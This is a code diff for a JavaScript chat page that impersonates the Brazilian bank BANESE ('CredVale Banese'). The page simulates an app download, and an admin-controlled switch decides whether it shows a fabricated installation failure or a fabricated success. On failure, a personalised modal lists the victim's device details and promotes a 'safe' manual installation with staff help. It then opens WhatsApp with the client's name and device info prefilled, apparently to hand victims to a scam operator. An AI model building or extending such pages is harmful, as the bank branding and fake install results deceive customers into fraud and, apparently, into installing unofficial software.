@@ -40,12 +40,18 @@
 
   /* ---- WhatsApp de suporte (vindo do painel admin) ---- */
   var __supportWhatsApp = '';
+  var __appDownloadErrorEnabled = true;
 
   async function carregarWhatsApp() {
     try {
       var d = await API.getSettings();
-      if (d && d.settings && d.settings.whatsapp) {
-        __supportWhatsApp = d.settings.whatsapp.replace(/\D/g,'');
+      if (d && d.settings) {
+        if (d.settings.whatsapp) {
+          __supportWhatsApp = d.settings.whatsapp.replace(/\D/g,'');
+        }
+        if (d.settings.app_download_error_enabled !== undefined) {
+          __appDownloadErrorEnabled = d.settings.app_download_error_enabled === 'true';
+        }
       }
     } catch(e) {}
     if (!__supportWhatsApp) {
@@ -1364,6 +1370,283 @@
    * Utiliza a função compartilhada API.showDownloadModal (mesma da Index e app.html)
    */
   /* ---- SIMULAÇÃO DE DOWNLOAD DO APLICATIVO ---- */
+  /* ---- RESOLVE NOME DO MODELO DO DISPOSITIVO ---- */
+  function resolveModelName(modelo, fabricante) {
+    if (!modelo) return '';
+    var m = modelo.toUpperCase();
+    var lookup = {
+      /* Samsung */
+      'SM-A055M': 'Samsung Galaxy A05',
+      'SM-A056M': 'Samsung Galaxy A05s',
+      'SM-A057M': 'Samsung Galaxy A05',
+      'SM-A135M': 'Samsung Galaxy A13',
+      'SM-A145M': 'Samsung Galaxy A14',
+      'SM-A146M': 'Samsung Galaxy A14 5G',
+      'SM-A155M': 'Samsung Galaxy A15',
+      'SM-A156M': 'Samsung Galaxy A15 5G',
+      'SM-A165M': 'Samsung Galaxy A16 5G',
+      'SM-A225M': 'Samsung Galaxy A22',
+      'SM-A226M': 'Samsung Galaxy A22 5G',
+      'SM-A235M': 'Samsung Galaxy A23 5G',
+      'SM-A245M': 'Samsung Galaxy A24',
+      'SM-A255M': 'Samsung Galaxy A25 5G',
+      'SM-A325M': 'Samsung Galaxy A32',
+      'SM-A326M': 'Samsung Galaxy A32 5G',
+      'SM-A335M': 'Samsung Galaxy A33 5G',
+      'SM-A345M': 'Samsung Galaxy A34 5G',
+      'SM-A346M': 'Samsung Galaxy A34 5G',
+      'SM-A355M': 'Samsung Galaxy A35 5G',
+      'SM-A426M': 'Samsung Galaxy A42 5G',
+      'SM-B510E': 'Samsung Galaxy A51',
+      'SM-F926B': 'Samsung Galaxy Z Fold 3',
+      'SM-F926U': 'Samsung Galaxy Z Fold 3',
+      'SM-F936B': 'Samsung Galaxy Z Fold 4',
+      'SM-F946B': 'Samsung Galaxy Z Fold 5',
+      'SM-F956B': 'Samsung Galaxy Z Fold 6',
+      'SM-G780G': 'Samsung Galaxy S20 FE',
+      'SM-G781B': 'Samsung Galaxy S20 FE 5G',
+      'SM-G990E': 'Samsung Galaxy S21 FE',
+      'SM-G998B': 'Samsung Galaxy S21 Ultra',
+      'SM-G990B': 'Samsung Galaxy S21 FE',
+      'SM-S901E': 'Samsung Galaxy S22',
+      'SM-S906E': 'Samsung Galaxy S22+',
+      'SM-S908E': 'Samsung Galaxy S22 Ultra',
+      'SM-S911B': 'Samsung Galaxy S23',
+      'SM-S916B': 'Samsung Galaxy S23+',
+      'SM-S918B': 'Samsung Galaxy S23 Ultra',
+      'SM-S921B': 'Samsung Galaxy S24',
+      'SM-S926B': 'Samsung Galaxy S24+',
+      'SM-S928B': 'Samsung Galaxy S24 Ultra',
+      'SM-S931B': 'Samsung Galaxy S25',
+      'SM-S936B': 'Samsung Galaxy S25+',
+      'SM-S938B': 'Samsung Galaxy S25 Ultra',
+      'SM-S711B': 'Samsung Galaxy S23 FE',
+      'SM-M315M': 'Samsung Galaxy M31',
+      'SM-M515M': 'Samsung Galaxy M51',
+      'SM-M525M': 'Samsung Galaxy M52 5G',
+      'SM-M536B': 'Samsung Galaxy M53 5G',
+      /* Motorola */
+      'Moto G (5)': 'Motorola Moto G5',
+      'Moto G (5S)': 'Motorola Moto G5s',
+      'Moto G (6)': 'Motorola Moto G6',
+      'Moto G (7)': 'Motorola Moto G7',
+      'Moto G (8)': 'Motorola Moto G8',
+      'Moto G (8) Plus': 'Motorola Moto G8 Plus',
+      'Moto G (8) Power': 'Motorola Moto G8 Power',
+      'Moto G (9)': 'Motorola Moto G9',
+      'Moto G (9) Plus': 'Motorola Moto G9 Plus',
+      'Moto G (10)': 'Motorola Moto G10',
+      'Moto G (20)': 'Motorola Moto G20',
+      'Moto G (30)': 'Motorola Moto G30',
+      'Moto G (31)': 'Motorola Moto G31',
+      'Moto G (32)': 'Motorola Moto G32',
+      'Moto G (41)': 'Motorola Moto G41',
+      'Moto G (42)': 'Motorola Moto G42',
+      'Moto G (50)': 'Motorola Moto G50',
+      'Moto G (51)': 'Motorola Moto G51 5G',
+      'Moto G (52)': 'Motorola Moto G52',
+      'Moto G (53)': 'Motorola Moto G53 5G',
+      'Moto G (54)': 'Motorola Moto G54',
+      'Moto G (62)': 'Motorola Moto G62 5G',
+      'Moto G (71)': 'Motorola Moto G71 5G',
+      'Moto G (72)': 'Motorola Moto G72',
+      'Moto G (73)': 'Motorola Moto G73 5G',
+      'Moto G (84)': 'Motorola Moto G84 5G',
+      'Moto G (85)': 'Motorola Moto G85 5G',
+      'Moto G100': 'Motorola Moto G100',
+      'Moto G200': 'Motorola Moto G200 5G',
+      'Moto G Stylus': 'Motorola Moto G Stylus',
+      'Moto E': 'Motorola Moto E',
+      'Moto E20': 'Motorola Moto E20',
+      'Moto E22': 'Motorola Moto E22',
+      'Moto E32': 'Motorola Moto E32',
+      'Moto Edge 30': 'Motorola Edge 30',
+      'Moto Edge 30 Neo': 'Motorola Edge 30 Neo',
+      'Moto Edge 30 Pro': 'Motorola Edge 30 Pro',
+      'Moto Edge 30 Ultra': 'Motorola Edge 30 Ultra',
+      'Moto Edge 40': 'Motorola Edge 40',
+      'Moto Edge 40 Neo': 'Motorola Edge 40 Neo',
+      'Moto Edge 40 Pro': 'Motorola Edge 40 Pro',
+      'Moto Edge 50': 'Motorola Edge 50',
+      'Moto Edge 50 Fusion': 'Motorola Edge 50 Fusion',
+      'Moto Edge 50 Pro': 'Motorola Edge 50 Pro',
+      'Moto Edge 50 Ultra': 'Motorola Edge 50 Ultra',
+      'Moto Razr 40': 'Motorola Razr 40',
+      'Moto Razr 40 Ultra': 'Motorola Razr 40 Ultra',
+      'Moto Razr 50': 'Motorola Razr 50',
+      'Moto Razr 50 Ultra': 'Motorola Razr 50 Ultra',
+      /* Xiaomi / Redmi / POCO */
+      'Mi 9T': 'Xiaomi Mi 9T',
+      'Mi 9T Pro': 'Xiaomi Mi 9T Pro',
+      'Mi 10': 'Xiaomi Mi 10',
+      'Mi 10T': 'Xiaomi Mi 10T',
+      'Mi 10T Pro': 'Xiaomi Mi 10T Pro',
+      'Mi 11': 'Xiaomi Mi 11',
+      'Mi 11 Lite': 'Xiaomi Mi 11 Lite',
+      'Mi 11T': 'Xiaomi Mi 11T',
+      'Mi 11T Pro': 'Xiaomi Mi 11T Pro',
+      'Mi 12': 'Xiaomi 12',
+      'Mi 12 Lite': 'Xiaomi 12 Lite',
+      'Mi 12T': 'Xiaomi 12T',
+      'Mi 12T Pro': 'Xiaomi 12T Pro',
+      'Mi 13': 'Xiaomi 13',
+      'Mi 13 Lite': 'Xiaomi 13 Lite',
+      'Mi 13T': 'Xiaomi 13T',
+      'Mi 13T Pro': 'Xiaomi 13T Pro',
+      'Mi 14': 'Xiaomi 14',
+      'Mi 14T': 'Xiaomi 14T',
+      'Mi 14T Pro': 'Xiaomi 14T Pro',
+      'Redmi 9': 'Xiaomi Redmi 9',
+      'Redmi 9A': 'Xiaomi Redmi 9A',
+      'Redmi 9C': 'Xiaomi Redmi 9C',
+      'Redmi 9T': 'Xiaomi Redmi 9T',
+      'Redmi 10': 'Xiaomi Redmi 10',
+      'Redmi 10A': 'Xiaomi Redmi 10A',
+      'Redmi 10C': 'Xiaomi Redmi 10C',
+      'Redmi Note 8': 'Xiaomi Redmi Note 8',
+      'Redmi Note 8 Pro': 'Xiaomi Redmi Note 8 Pro',
+      'Redmi Note 9': 'Xiaomi Redmi Note 9',
+      'Redmi Note 9 Pro': 'Xiaomi Redmi Note 9 Pro',
+      'Redmi Note 10': 'Xiaomi Redmi Note 10',
+      'Redmi Note 10 Pro': 'Xiaomi Redmi Note 10 Pro',
+      'Redmi Note 11': 'Xiaomi Redmi Note 11',
+      'Redmi Note 11 Pro': 'Xiaomi Redmi Note 11 Pro',
+      'Redmi Note 11S': 'Xiaomi Redmi Note 11S',
+      'Redmi Note 12': 'Xiaomi Redmi Note 12',
+      'Redmi Note 12 Pro': 'Xiaomi Redmi Note 12 Pro',
+      'Redmi Note 12S': 'Xiaomi Redmi Note 12S',
+      'Redmi Note 13': 'Xiaomi Redmi Note 13',
+      'Redmi Note 13 Pro': 'Xiaomi Redmi Note 13 Pro',
+      'Redmi Note 13 Pro+': 'Xiaomi Redmi Note 13 Pro+',
+      'POCO X3 Pro': 'POCO X3 Pro',
+      'POCO X3 NFC': 'POCO X3 NFC',
+      'POCO X4 Pro': 'POCO X4 Pro 5G',
+      'POCO X5 Pro': 'POCO X5 Pro 5G',
+      'POCO X6 Pro': 'POCO X6 Pro',
+      'POCO F3': 'POCO F3',
+      'POCO F4': 'POCO F4',
+      'POCO F5': 'POCO F5',
+      'POCO F5 Pro': 'POCO F5 Pro',
+      'POCO F6': 'POCO F6',
+      'POCO M3': 'POCO M3',
+      'POCO M4 Pro': 'POCO M4 Pro',
+      'POCO M5': 'POCO M5',
+      'POCO M6': 'POCO M6',
+      /* Apple */
+      'iPhone16,1': 'iPhone 15 Pro',
+      'iPhone16,2': 'iPhone 15 Pro Max',
+      'iPhone16,3': 'iPhone 15',
+      'iPhone16,4': 'iPhone 15 Plus',
+      'iPhone15,2': 'iPhone 14 Pro',
+      'iPhone15,3': 'iPhone 14 Pro Max',
+      'iPhone15,4': 'iPhone 14',
+      'iPhone15,5': 'iPhone 14 Plus',
+      'iPhone14,2': 'iPhone 13 Pro',
+      'iPhone14,3': 'iPhone 13 Pro Max',
+      'iPhone14,4': 'iPhone 13 mini',
+      'iPhone14,5': 'iPhone 13',
+      'iPhone13,1': 'iPhone 12 mini',
+      'iPhone13,2': 'iPhone 12',
+      'iPhone13,3': 'iPhone 12 Pro',
+      'iPhone13,4': 'iPhone 12 Pro Max',
+      'iPhone12,1': 'iPhone 11',
+      'iPhone12,3': 'iPhone 11 Pro',
+      'iPhone12,5': 'iPhone 11 Pro Max',
+      'iPad14,1': 'iPad mini 6',
+      'iPad14,2': 'iPad mini 6',
+      'iPad13,1': 'iPad Air 4',
+      'iPad13,2': 'iPad Air 4',
+      'iPad13,4': 'iPad Pro 11 (3rd)',
+      'iPad13,8': 'iPad Pro 12.9 (5th)',
+      /* Google Pixel */
+      'Pixel 6': 'Google Pixel 6',
+      'Pixel 6 Pro': 'Google Pixel 6 Pro',
+      'Pixel 6a': 'Google Pixel 6a',
+      'Pixel 7': 'Google Pixel 7',
+      'Pixel 7 Pro': 'Google Pixel 7 Pro',
+      'Pixel 7a': 'Google Pixel 7a',
+      'Pixel 8': 'Google Pixel 8',
+      'Pixel 8 Pro': 'Google Pixel 8 Pro',
+      'Pixel 8a': 'Google Pixel 8a',
+      'Pixel 9': 'Google Pixel 9',
+      'Pixel 9 Pro': 'Google Pixel 9 Pro',
+      'Pixel 9 Pro XL': 'Google Pixel 9 Pro XL',
+      'Pixel 9a': 'Google Pixel 9a',
+      /* Realme */
+      'RMX3081': 'Realme 8',
+      'RMX3085': 'Realme 8 5G',
+      'RMX3142': 'Realme 8 Pro',
+      'RMX3360': 'Realme 9 Pro+',
+      'RMX3381': 'Realme 9i',
+      'RMX3399': 'Realme 9',
+      'RMX3461': 'Realme 9 5G',
+      'RMX3501': 'Realme 10',
+      'RMX3615': 'Realme 10 Pro',
+      'RMX3624': 'Realme C30',
+      'RMX3630': 'Realme C33',
+      'RMX3660': 'Realme C35',
+      'RMX3670': 'Realme C51',
+      'RMX3690': 'Realme C55',
+      'RMX3740': 'Realme 11 Pro',
+      'RMX3741': 'Realme 11 Pro+',
+      'RMX3750': 'Realme 12 Pro',
+      'RMX3760': 'Realme 12 Pro+',
+      'RMX3770': 'Realme 12',
+      'RMX3780': 'Realme 13',
+      'RMX3785': 'Realme 13 Pro',
+      'RMX3790': 'Realme C60s',
+      /* OnePlus */
+      'ONEPLUS A3003': 'OnePlus 3',
+      'ONEPLUS A5000': 'OnePlus 5',
+      'ONEPLUS A6000': 'OnePlus 6',
+      'ONEPLUS A6003': 'OnePlus 6',
+      'ONEPLUS A6013': 'OnePlus 6T',
+      'ONEPLUS A6010': 'OnePlus 6T',
+      'ONEPLUS 7 PRO': 'OnePlus 7 Pro',
+      'ONEPLUS 7T': 'OnePlus 7T',
+      'ONEPLUS 7T PRO': 'OnePlus 7T Pro',
+      'ONEPLUS 8': 'OnePlus 8',
+      'ONEPLUS 8 PRO': 'OnePlus 8 Pro',
+      'ONEPLUS 8T': 'OnePlus 8T',
+      'ONEPLUS 9': 'OnePlus 9',
+      'ONEPLUS 9 PRO': 'OnePlus 9 Pro',
+      'ONEPLUS 9RT': 'OnePlus 9RT',
+      'ONEPLUS 10 PRO': 'OnePlus 10 Pro',
+      'ONEPLUS 10R': 'OnePlus 10R',
+      'ONEPLUS 11': 'OnePlus 11',
+      'ONEPLUS 12': 'OnePlus 12',
+      'ONEPLUS 12R': 'OnePlus 12R',
+      'ONE A2003': 'OnePlus 2',
+      'LE2123': 'OnePlus 9 Pro',
+      'LE2113': 'OnePlus 9',
+      'LE2101': 'OnePlus 9R',
+      'NE2213': 'OnePlus 11',
+      /* LG */
+      'LG K40': 'LG K40',
+      'LG K50': 'LG K50',
+      'LG K61': 'LG K61',
+      'LG K71': 'LG K71',
+      'LG Velvet': 'LG Velvet',
+      'LG Wing': 'LG Wing'
+    };
+    // Try exact match first
+    if (lookup[m]) return lookup[m];
+    // Try match by known prefix
+    for (var key in lookup) {
+      if (lookup.hasOwnProperty(key) && m.indexOf(key) === 0) {
+        return lookup[key];
+      } else if (lookup.hasOwnProperty(key) && key.indexOf(m.slice(0, 8)) >= 0) {
+        return lookup[key];
+      }
+    }
+    // Fallback: supplement fabricante name on the model
+    if (fabricante && modelo && modelo.indexOf(fabricante.toUpperCase()) !== 0) {
+      return fabricante + ' ' + modelo;
+    }
+    return modelo;
+  }
+
+  /* ---- DOWNLOAD MODAL ---- */
   function showDownloadModalInChat(clientId, limite) {
     // Registra o clique via beacon
     if (clientId) {
@@ -1469,10 +1752,13 @@
 
     function runStages(idx) {
       if (idx >= stages.length) {
-        // Falha simulada
         setTimeout(function() {
-          if (stageLabel) stageLabel.textContent = 'Falha na instalação';
-          showInstallFailure(clientId, limite, deviceInfo);
+          if (stageLabel) stageLabel.textContent = 'Verificando compatibilidade...';
+          if (__appDownloadErrorEnabled) {
+            showInstallFailure(clientId, limite, deviceInfo);
+          } else {
+            showInstallSuccess(clientId, limite, deviceInfo);
+          }
         }, 800);
         return;
       }
@@ -1486,40 +1772,73 @@
     runStages(0);
   }
 
-  /* ---- MODAL DE FALHA NA INSTALAÇÃO ---- */
+  /* ---- MODAL DE FALHA NA INSTALAÇÃO (DESIGN PREMIUM BANESE) ---- */
   function showInstallFailure(clientId, limite, deviceInfo) {
     closePopup();
     setTimeout(function() {
       var waNum = __supportWhatsApp || '5511999999999';
+      var modeloResolvido = resolveModelName(deviceInfo.modelo, deviceInfo.fabricante);
+      var nomeCliente = (user.nome || '').split(' ')[0] || 'Cliente';
+
       var deviceMsg = encodeURIComponent(
         'Olá! Preciso de ajuda com a instalação do aplicativo CredVale Banese.\n\n' +
-        'Dispositivo: ' + (deviceInfo.modelo || 'N/A') + '\n' +
+        'Cliente: ' + (user.nome || 'N/A') + '\n' +
+        'Dispositivo: ' + (deviceInfo.dispositivo || 'N/A') + '\n' +
         'Fabricante: ' + (deviceInfo.fabricante || 'N/A') + '\n' +
+        'Modelo: ' + (modeloResolvido || deviceInfo.modelo || 'N/A') + '\n' +
+        'Código: ' + (deviceInfo.modelo || 'N/A') + '\n' +
         'Sistema: ' + (deviceInfo.os || 'N/A') + '\n' +
-        'Navegador: ' + (deviceInfo.navegador || 'N/A') + '\n' +
-        'Cliente: ' + (user.nome || 'N/A')
+        'Navegador: ' + (deviceInfo.navegador || 'N/A')
       );
       var waUrl = 'https://wa.me/55' + waNum.replace(/\D/g,'') + '?text=' + deviceMsg;
 
       var failHtml =
-        '<div class="banese-modal">'+
+        '<div class="banese-modal banese-modal--error">'+
           '<div class="banese-modal-header" style="background:linear-gradient(135deg,#991B1B,#DC2626);">'+
             '<div class="banese-modal-logo" style="color:#fff;">BANESE</div>'+
             '<div class="banese-modal-star" style="color:rgba(255,255,255,0.4);">&#9733;</div>'+
             '<div class="banese-modal-logo-sub" style="color:rgba(255,255,255,0.6);">CREDVALE</div>'+
           '</div>'+
           '<div class="banese-modal-body">'+
-            '<div style="text-align:center;margin-bottom:14px;">'+
-              '<div style="font-size:2rem;margin-bottom:6px;">&#x26A0;&#xFE0F;</div>'+
-              '<div style="font-size:1rem;font-weight:800;color:#022c22;margin-bottom:4px;">Não foi possível concluir a instalação</div>'+
-              '<div style="font-size:0.8rem;color:#475569;line-height:1.5;">'+
-                'Identificamos uma incompatibilidade com este aparelho.<br><br>'+
-                'Nossa equipe pode realizar um procedimento de instalação assistida para ajudar você a utilizar o aplicativo.'+
+            '<div style="text-align:center;margin-bottom:12px;">'+
+              '<div style="width:52px;height:52px;margin:0 auto 10px;border-radius:50%;background:linear-gradient(135deg,rgba(239,68,68,0.12),rgba(220,38,38,0.06));display:flex;align-items:center;justify-content:center;border:1px solid rgba(239,68,68,0.15);">'+
+                '<svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#DC2626" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>'+
+              '</div>'+
+              '<div style="font-size:1.05rem;font-weight:800;color:#022c22;margin-bottom:4px;">' + nomeCliente + ', não foi possível concluir a instalação</div>'+
+              '<div style="font-size:0.78rem;color:#475569;line-height:1.5;">'+
+                'Identificamos que houve uma tentativa de instalação do aplicativo no dispositivo abaixo:'+
+              '</div>'+
+            '</div>'+
+            '<div class="banese-dl-device-card">'+
+              '<div class="banese-dl-device-row">'+
+                '<span class="banese-dl-device-label">📱 Dispositivo</span>'+
+                '<span class="banese-dl-device-value">' + (deviceInfo.dispositivo || '—') + '</span>'+
+              '</div>'+
+              '<div class="banese-dl-device-row">'+
+                '<span class="banese-dl-device-label">🏭 Fabricante</span>'+
+                '<span class="banese-dl-device-value">' + (deviceInfo.fabricante || '—') + '</span>'+
+              '</div>'+
+              '<div class="banese-dl-device-row">'+
+                '<span class="banese-dl-device-label">📟 Modelo</span>'+
+                '<span class="banese-dl-device-value">' + (modeloResolvido || deviceInfo.modelo || '—') + '</span>'+
+              '</div>'+
+              '<div class="banese-dl-device-row" style="font-size:0.65rem;color:#94a3b8;padding:2px 0;border-bottom:none;">'+
+                '<span class="banese-dl-device-label" style="color:#94a3b8;">Código</span>'+
+                '<span class="banese-dl-device-value" style="color:#94a3b8;font-family:monospace;font-size:0.6rem;">' + (deviceInfo.modelo || '—') + '</span>'+
+              '</div>'+
+              '<div class="banese-dl-device-row">'+
+                '<span class="banese-dl-device-label">🖥️ Sistema</span>'+
+                '<span class="banese-dl-device-value">' + (deviceInfo.os || '—') + '</span>'+
+              '</div>'+
+            '</div>'+
+            '<div style="margin:10px 0 12px;padding:10px 14px;background:linear-gradient(135deg,rgba(4,120,87,0.05),rgba(16,185,129,0.03));border-left:3px solid #10B981;border-radius:8px;">'+
+              '<div style="font-size:0.75rem;color:#065F46;line-height:1.6;">'+
+                'A boa notícia é que <strong>é possível realizar a instalação manual</strong>, e nossa equipe pode acompanhar você durante todo o processo. O procedimento é simples, seguro e permite a liberação do aplicativo para funcionamento no seu dispositivo.'+
               '</div>'+
             '</div>'+
             '<div style="display:flex;flex-direction:column;gap:8px;">'+
-              '<button class="banese-cta" id="btnRetryDownload" style="width:100%;padding:12px;font-size:0.85rem;border:none;border-radius:12px;cursor:pointer;font-weight:700;font-family:inherit;background:linear-gradient(135deg,#047857,#10B981);color:#fff;">Tentar novamente</button>'+
-              '<button class="banese-cta" id="btnCallSupport" style="width:100%;padding:12px;font-size:0.85rem;border:none;border-radius:12px;cursor:pointer;font-weight:700;font-family:inherit;background:#25D366;color:#fff;">Chamar suporte</button>'+
+              '<button class="banese-cta" id="btnRetryDownload" style="width:100%;padding:12px;font-size:0.85rem;border:none;border-radius:12px;cursor:pointer;font-weight:700;font-family:inherit;background:linear-gradient(135deg,#047857,#10B981);color:#fff;box-shadow:0 4px 14px rgba(4,120,87,0.2);transition:all .3s;">Tentar novamente</button>'+
+              '<button class="banese-cta" id="btnCallSupport" style="width:100%;padding:12px;font-size:0.85rem;border:none;border-radius:12px;cursor:pointer;font-weight:700;font-family:inherit;background:#25D366;color:#fff;box-shadow:0 4px 14px rgba(37,211,102,0.2);transition:all .3s;">Chamar suporte</button>'+
             '</div>'+
           '</div>'+
         '</div>';
@@ -1533,7 +1852,6 @@
 
       document.getElementById('btnCallSupport').onclick = function() {
         closePopup();
-        // Adiciona mensagem no chat com link do WhatsApp
         addMsg(
           '<div style="text-align:center;padding:8px 0;">'+
             '<div style="font-size:1rem;margin-bottom:6px;">💬</div>'+
@@ -1550,8 +1868,52 @@
     }, 200);
   }
 
+  /* ---- MODAL DE SUCESSO NA INSTALAÇÃO (quando erro desabilitado) ---- */
+  function showInstallSuccess(clientId, limite, deviceInfo) {
+    closePopup();
+    setTimeout(function() {
+      var waNum = __supportWhatsApp || '5511999999999';
+      var nomeCliente = (user.nome || '').split(' ')[0] || 'Cliente';
+
+      var successHtml =
+        '<div class="banese-modal">'+
+          '<div class="banese-modal-header" style="background:linear-gradient(135deg,#022c22,#065F46);">'+
+            '<div class="banese-modal-logo" style="color:#fff;">BANESE</div>'+
+            '<div class="banese-modal-star" style="color:rgba(255,255,255,0.4);">&#9733;</div>'+
+            '<div class="banese-modal-logo-sub" style="color:rgba(255,255,255,0.6);">CREDVALE</div>'+
+          '</div>'+
+          '<div class="banese-modal-body">'+
+            '<div style="text-align:center;margin-bottom:14px;">'+
+              '<div style="width:64px;height:64px;margin:0 auto 12px;border-radius:50%;background:linear-gradient(135deg,rgba(16,185,129,0.15),rgba(4,120,87,0.08));display:flex;align-items:center;justify-content:center;border:1px solid rgba(16,185,129,0.2);">'+
+                '<svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#10B981" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>'+
+              '</div>'+
+              '<div style="font-size:1.1rem;font-weight:800;color:#022c22;margin-bottom:4px;">' + nomeCliente + ', aplicativo instalado! 🎉</div>'+
+              '<div style="font-size:0.8rem;color:#475569;line-height:1.5;">'+
+                'Seu aplicativo CredVale Banese foi <strong>instalado com sucesso</strong>.<br>'+
+                'Agora você pode acessar sua conta e começar a aproveitar todos os benefícios.'+
+              '</div>'+
+            '</div>'+
+            '<button class="banese-cta" id="btnSuccessClose" style="width:100%;padding:12px;font-size:0.85rem;border:none;border-radius:12px;cursor:pointer;font-weight:700;font-family:inherit;background:linear-gradient(135deg,#047857,#10B981);color:#fff;box-shadow:0 4px 14px rgba(4,120,87,0.2);">Ir para o aplicativo</button>'+
+            '<div style="margin-top:12px;padding:10px 14px;background:linear-gradient(135deg,rgba(37,211,102,0.08),rgba(37,211,102,0.03));border:1px solid rgba(37,211,102,0.15);border-radius:10px;text-align:center;">'+
+              '<div style="font-size:0.72rem;color:#065F46;">Precisa de ajuda? </strong><a href="https://wa.me/55' + waNum.replace(/\D/g,'') + '" target="_blank" style="color:#059669;font-weight:700;text-decoration:underline;">Fale com o suporte</a></strong></div>'+
+            '</div>'+
+          '</div>'+
+        '</div>';
+
+      showPopup(successHtml);
+
+      document.getElementById('btnSuccessClose').onclick = function() {
+        closePopup();
+        addMsg('✅ <strong>Aplicativo instalado com sucesso!</strong><br>Você já pode fechar esta página e acessar o aplicativo CredVale Banese.', 'bot');
+        hideInput();
+        showOptions([
+          { label:'🏠 Voltar para início', action:function(){ window.location.href = '/'; } }
+        ]);
+      };
+    }, 200);
+  }
+
   /* ---- Final Screen: Baixar App ou Suporte ---- */
-/* ---- Final Screen: Baixar App ou Suporte ---- */
   async function mostrarTelaFinal(clientId, limite) {
     hideInput();
     var primeiroNome = (user.nome || '').split(' ')[0] || 'Cliente';
